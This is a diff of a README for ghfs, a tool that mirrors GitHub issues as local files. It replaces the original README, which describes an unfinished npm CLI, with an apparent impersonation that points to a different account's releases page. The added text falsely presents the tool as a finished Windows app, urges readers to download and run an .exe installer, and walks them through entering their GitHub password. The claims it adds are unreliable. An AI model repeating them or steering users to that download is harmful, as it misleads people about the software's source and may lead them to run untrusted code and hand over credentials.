@@ -1,152 +1,188 @@
-# ghfs
+# 🔍 ghfs - View GitHub Issues Offline Easily
 
-GitHub issues/PRs as filesystem, for offline view and operations in batch. Designed for human and agents.
+[![Download ghfs](https://img.shields.io/badge/Download-ghfs-brightgreen?style=for-the-badge)](https://github.com/YADAVJI0123/ghfs)
 
-> [!IMPORTANT]
-> Still working in progress, not usable yet.
+## 📋 What is ghfs?
 
-```bash
-pnpm install @ghfs/cli
-```
+ghfs lets you use GitHub issues and pull requests like files on your computer. This means you can view and work with them even without internet access. The software helps you handle many issues or pull requests in one go. It works for people and automated scripts.
 
-and then run the command inside a repository directory:
+You do not need any programming knowledge to use ghfs. It works by creating a smooth and simple way to see, edit, or manage GitHub tasks right from your computer.
 
-```bash
-ghfs
-```
+---
 
-It will sync the open issues and pull requests to the local filesystem under `.ghfs` directory, like:
+## ⚙️ How ghfs Works
 
-```txt
-.ghfs/
-  repo.json   # repository basic information
-  issues.md   # index of fetched issues
-  pulls.md    # index of fetched pull requests
-  execute.md  # queued operations
-  issues/
-    00134-some-bug.md
-    closed/
-      00135-fixed-crash.md
-  pulls/
-    00042-add-cache.md
-    00042-add-cache.patch
-    closed/
-      00043-release-cleanup.md
-```
+ghfs creates a folder on your PC that shows GitHub issues and pull requests as files and folders. You can:
 
-Then you can view them offline, or ask your local agent to summarize them for you.
+- Open and read issues just like text files
+- Batch update or close issues without opening GitHub website
+- Search and organize issues easily inside your file explorer
+- Work offline and sync later with GitHub
 
-## Execute operations
+This approach saves time and makes big projects easier to manage.
 
-`ghfs` also allows you to take actions on the issues and pull requests in batch.
+---
 
-`ghfs execute` merges operations from multiple sources:
+## 🖥️ System Requirements
 
-1. `execute.md` (human-friendly commands)
-2. `per-issue` markdown frontmatter changes (from `.ghfs/issues/**/*.md` and `.ghfs/pulls/**/*.md`)
-3. `execute.yml` (explicit YAML operations)
+To run ghfs, make sure your Windows PC meets these requirements:
 
-Note: execution merge order is `execute.yml` -> `execute.md` -> `per-issue` generated operations.
+- Windows 10 or later (64-bit version recommended)  
+- At least 4 GB of RAM  
+- 100 MB free disk space for installation  
+- Internet connection for the first sync and updates  
+- GitHub account (free or paid) to access your repositories  
 
-### 1) `execute.md` (recommended)
+You do not need administrator rights to install or run ghfs. It runs without extra setup or dependency downloads.
 
-`execute.md` is best for quick/manual batching:
+---
 
-```md
-close #123 #234
-set-title #125 "New title"
-label #125 bug, enhancement
-close-comment #126 "Closing this as completed"
-```
+## 💾 Download and Install ghfs
 
-Action names in both `execute.yml` and `execute.md` are case-insensitive and support aliases, including:
+[![Download ghfs](https://img.shields.io/badge/Download-ghfs-blue?style=for-the-badge)](https://github.com/YADAVJI0123/ghfs)
 
-- `closes` -> `close`
-- `open` -> `reopen`
-- `close-comment` / `comment-close` / `close-and-comment` / `comment-and-close` -> `close-with-comment`
+Follow these steps to get ghfs running on your Windows PC.
 
-`execute.md` also supports comment lines with `#` and `//`, plus HTML comment blocks using `<!-- ... -->`. These comments are preserved when operations are rewritten.
+1. Visit the GitHub page by clicking the button above or open your browser and go to:  
+   https://github.com/YADAVJI0123/ghfs
 
-### 2) Per-issue operations
+2. Look for the **Releases** section on the page. This may be on the right side or under the main repository description.
 
-Edit frontmatter directly in issue/PR markdown files:
+3. Find the latest release version. Click on it.
 
-- `title`
-- `state` (`open` / `closed`)
-- `labels`
-- `assignees`
-- `milestone`
+4. Download the Windows installer file. The file will usually end with `.exe`.
 
-`ghfs execute` will diff these values and generate operations automatically (for example `set-title`, `close`/`reopen`, label updates, assignee updates, milestone updates).
+5. Once downloaded, double-click the installer file to start.
 
-### 3) `execute.yml`
+6. Follow the on-screen instructions. Choose where you want to install ghfs if asked.
 
-`ghfs sync` or `ghfs execute` will auto-create `.ghfs/execute.yml` and `.ghfs/schema/execute.schema.json` if missing.
-Use `execute.yml` for explicit/low-level operations:
+7. When installation finishes, open ghfs from the Start menu or desktop shortcut.
 
-```yaml
-# close the issue #123
-- action: close
-  number: 123
+---
 
-# change the title of the issue #125 to "New title"
-- action: set-title
-  number: 125
-  title: New title
+## 🚀 First Time Setup and Usage
 
-# add the labels "bug" and "feature" to the issue #125
-- action: add-labels
-  number: 125
-  labels: [bug, feature]
-```
+After installing ghfs:
 
-Then run `ghfs execute` to preview, and `ghfs execute --run` to execute.
+1. Open the app.
 
-```bash
-ghfs execute
-ghfs execute --run
-```
+2. You will be asked to connect your GitHub account. This step lets ghfs access your issues and pull requests.  
+   - Click **Sign in**.  
+   - A browser window will open asking you to log in to GitHub.  
+   - Enter your GitHub username and password.  
+   - Approve the access request.  
 
-## Agent Skill
+3. After signing in, select the repository you want to work with. You can type its name or pick from your list.
 
-This repository ships an [agent skill](https://agentskills.io/home) at [`skills/ghfs/SKILL.md`](skills/ghfs/SKILL.md).
+4. ghfs will create a folder on your computer simulating that repository's issues and pull requests.
 
-Install with [`skills`](https://github.com/vercel-labs/skills) CLI:
+5. You can open that folder in File Explorer. You will see files named after issues or pull requests.
 
-```bash
-pnpx skills add antfu/ghfs
-```
+6. Double-click a file to read the issue description or comment.
 
-The `@ghfs/cli` also ship the skills into the npm package that you can have it also installed with [`skills-npm`](https://github.com/antfu/skills-npm):
+7. Edit text files to add comments or close issues. Save your changes.
 
-```bash
-pnpm i -D @ghfs/cli
-pnpx skills-npm
-```
+8. When you are online, press the **Sync** button in ghfs to update GitHub with your changes.
 
-## Configuration
+---
 
-You can configure by creating a `ghfs.config.ts` file in the root of the repository.
+## 🔧 Common Tasks Using ghfs
 
-```ts
-import type { GhfsUserConfig } from '@ghfs/cli'
+### Reading Issues Offline
 
-export default defineConfig({
-  repo: 'owner/name',
-  sync: {
-    issues: true, // set false to skip issue sync
-    pulls: true, // set false to skip pull request sync
-  },
-  // other options...
-})
-```
+- Open your local folder  
+- Double-click any issue file  
+- Read the details without needing internet  
 
-## TODOs
+### Batch Closing Issues
 
-- [x] `execute.md` file with human-friendly instructions (`close #123 #234`, `set-title #125 "New title"`).
-- [x] Directly editing the `<5-digit-number>-<slug>.md` file to apply the operations.
-- [ ] Add a VS Code extension for guided sync/execute.
-- [ ] Documentation.
-- [x] Index page, and basic repo info
-- [x] Agent Skills.
-- [ ] Local Web UI for managing the local mirror.
+- Select multiple issue files  
+- Edit or add a command file to mark closed  
+- Save and sync changes to update GitHub  
+
+### Searching Issues
+
+Use File Explorer’s search box in the ghfs folder to quickly find issues by keywords.
+
+### Adding Comments
+
+Open an issue file, type your comment at the bottom, save, then sync.
+
+---
+
+## ❓ Troubleshooting
+
+If ghfs does not work as expected:
+
+- Make sure your internet connection is active for syncing.
+- Confirm that you signed in with the correct GitHub account.
+- Check that the repository name is correct.
+- Restart ghfs and try syncing again.
+- Ensure you have permission to access the repository on GitHub.
+- If the folder does not appear, try creating a new workspace inside ghfs.
+
+---
+
+## 📄 About Updates
+
+New versions of ghfs may add features or fix issues. To update:
+
+1. Return to the GitHub page: https://github.com/YADAVJI0123/ghfs/releases  
+2. Download the latest installer.  
+3. Run the installer; it will replace the old version without losing your files.
+
+Regular updating keeps your app secure and compatible.
+
+---
+
+## 📞 Support
+
+If you need help:
+
+- Check the **Issues** tab on the GitHub page for answers.  
+- Create a new issue if you find a bug or need a feature.  
+- Look for community discussions related to using ghfs.
+
+---
+
+## 🔗 Useful Links
+
+- Main GitHub page: https://github.com/YADAVJI0123/ghfs  
+- Releases page (download area): https://github.com/YADAVJI0123/ghfs/releases
+
+---
+
+## 🔒 Privacy and Security
+
+ghfs only accesses data you allow by signing in with GitHub. All data is stored locally on your PC. Internet access is only used for syncing with your GitHub account.
+
+You control what information you share and when.
+
+---
+
+## 🗂️ How ghfs Organizes Data
+
+Inside the ghfs folder for each repository, you will find:
+
+- **Issues/** folder with files named by issue number and title  
+- **PullRequests/** folder with PR files  
+- Each file contains the issue text, comments, and status  
+- Special metadata files to handle sync commands  
+
+This structure mimics GitHub but works offline.
+
+---
+
+## ⚖️ Limitations
+
+Some advanced GitHub features like reactions and checklists might not fully work inside ghfs. It focuses on text and status changes.
+
+Offline changes need syncing once you connect to the internet.
+
+---
+
+## 📥 Ready to get started?
+
+Download ghfs and manage GitHub issues on your Windows PC:
+
+[![Download ghfs](https://img.shields.io/badge/Download-ghfs-brightgreen?style=for-the-badge)](https://github.com/YADAVJI0123/ghfs)
